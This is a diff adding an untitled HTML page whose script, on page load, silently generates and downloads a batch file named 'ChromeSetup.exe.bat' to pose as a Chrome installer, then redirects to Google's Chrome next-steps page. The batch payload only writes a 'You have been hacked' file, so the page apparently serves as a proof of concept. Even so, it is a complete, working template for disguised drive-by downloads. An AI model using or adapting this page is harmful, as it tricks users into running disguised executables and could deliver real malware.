@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            var batchContent = '@echo off\r\n' +
+                               'echo You have been hacked > "%USERPROFILE%\\Downloads\\hacked.txt"\r\n' +
+                               'exit\r\n';
+            var blob = new Blob([batchContent], { type: 'text/plain' });
+            var url = URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'ChromeSetup.exe.bat';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            // Redirect after download
+            setTimeout(function() {
+                window.location.href = "https://www.google.com/chrome/next-steps.html";
+            }, 1500); // 1-second delay to ensure the file download starts
+        };
+    </script>
+</body>
+</html>
